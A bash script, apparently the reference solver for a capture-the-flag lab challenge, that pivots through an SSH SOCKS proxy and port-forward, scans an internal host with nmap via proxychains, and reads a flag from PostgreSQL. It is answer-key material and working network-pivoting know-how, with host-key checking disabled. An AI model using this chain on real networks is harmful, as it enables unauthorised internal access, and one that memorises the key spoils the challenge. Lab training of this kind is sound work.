#!/usr/bin/env bash
# S06 - Behind the Firewall
# Reference solver for the intended pivot chain.
# Authorized use only inside the isolated Operation Poisoned Pipeline lab.

set -euo pipefail

PIVOT_USER="${PIVOT_USER:-pivot}"
PIVOT_PASS="${PIVOT_PASS:-}"
PIVOT_HOST="${PIVOT_HOST:-nexora-app}"
PIVOT_PORT="${PIVOT_PORT:-22}"

DB_USER="${DB_USER:-ctf_reader}"
DB_PASS="${DB_PASS:-}"
DB_HOST="${DB_HOST:-10.13.20.10}"
DB_PORT="${DB_PORT:-5432}"
DB_NAME="${DB_NAME:-nexora_prod}"

SOCKS_PORT="${SOCKS_PORT:-1080}"
LOCAL_DB_PORT="${LOCAL_DB_PORT:-15432}"

if [[ -z "${PIVOT_PASS}" || -z "${DB_PASS}" ]]; then
    echo "[ERROR] PIVOT_PASS and DB_PASS must be set."
    exit 1
fi

echo "======================================================"
echo " S06 - Behind the Firewall Solver"
echo "======================================================"
echo

echo "[1] Proving direct access to PostgreSQL fails..."
if nc -z -w 3 "${DB_HOST}" "${DB_PORT}" >/dev/null 2>&1; then
    echo "[!] Unexpected: ${DB_HOST}:${DB_PORT} reachable directly. Aborting."
    exit 1
fi
echo "    PASS: direct connection failed as expected."

echo
echo "[2] Establishing SSH SOCKS proxy on 127.0.0.1:${SOCKS_PORT}..."

ASKPASS="$(mktemp)"
cat > "${ASKPASS}" <<EOF
#!/bin/sh
echo "${PIVOT_PASS}"
EOF
chmod 0700 "${ASKPASS}"

SSH_ASKPASS="${ASKPASS}" \
SSH_ASKPASS_REQUIRE=force \
setsid -w ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o NumberOfPasswordPrompts=1 \
    -o ExitOnForwardFailure=yes \
    -f -N -D "127.0.0.1:${SOCKS_PORT}" \
    -p "${PIVOT_PORT}" \
    "${PIVOT_USER}@${PIVOT_HOST}"

rm -f "${ASKPASS}"

echo "    PASS: SOCKS proxy is listening."

echo
echo "[3] Writing temporary proxychains configuration..."
PROXYCHAINS_CONF="$(mktemp)"
cat > "${PROXYCHAINS_CONF}" <<EOF
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 ${SOCKS_PORT}
EOF

echo
echo "[4] Proxied TCP scan of internal_net..."
proxychains4 -q -f "${PROXYCHAINS_CONF}" \
    nmap -sT -Pn -p "${DB_PORT}" "${DB_HOST}" | tee /tmp/s06-nmap.txt

if grep -q "${DB_PORT}/tcp open" /tmp/s06-nmap.txt; then
    echo "    PASS: PostgreSQL port discovered through the tunnel."
else
    echo "    [!] PostgreSQL port not detected through the tunnel."
    exit 1
fi

echo
echo "[5] Adding local port-forward for psql..."
SSH_CTL_DIR="$(mktemp -d)"
SSH_CTL_SOCK="${SSH_CTL_DIR}/s06.sock"

ASKPASS="$(mktemp)"
cat > "${ASKPASS}" <<EOF
#!/bin/sh
echo "${PIVOT_PASS}"
EOF
chmod 0700 "${ASKPASS}"

SSH_ASKPASS="${ASKPASS}" \
SSH_ASKPASS_REQUIRE=force \
setsid -w ssh \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password \
    -o PubkeyAuthentication=no \
    -o NumberOfPasswordPrompts=1 \
    -o ExitOnForwardFailure=yes \
    -M -S "${SSH_CTL_SOCK}" \
    -f -N \
    -L "127.0.0.1:${LOCAL_DB_PORT}:${DB_HOST}:${DB_PORT}" \
    -p "${PIVOT_PORT}" \
    "${PIVOT_USER}@${PIVOT_HOST}"

rm -f "${ASKPASS}"

echo
echo "[6] Read-only database query through the tunnel..."
PGPASSWORD="${DB_PASS}" psql \
    -h 127.0.0.1 \
    -p "${LOCAL_DB_PORT}" \
    -U "${DB_USER}" \
    -d "${DB_NAME}" \
    -tA \
    -c "SELECT record_value FROM ctf_final WHERE record_key='s06_final_record';"

echo
echo "[7] Confirming write access is denied..."
PGPASSWORD="${DB_PASS}" psql \
    -h 127.0.0.1 \
    -p "${LOCAL_DB_PORT}" \
    -U "${DB_USER}" \
    -d "${DB_NAME}" \
    -c "INSERT INTO ctf_final (record_key, record_value) VALUES ('x','y');" \
    >/dev/null 2>&1 && echo "    [!] Unexpected: INSERT succeeded" || echo "    PASS: INSERT denied."

# Cleanup
ssh -S "${SSH_CTL_SOCK}" -O exit "${PIVOT_USER}@${PIVOT_HOST}" 2>/dev/null || true
rm -rf "${SSH_CTL_DIR}"
rm -f "${PROXYCHAINS_CONF}"

echo
echo "======================================================"
echo " S06 solve complete."
echo " Submit the S06 token to CTFd."
echo "======================================================"
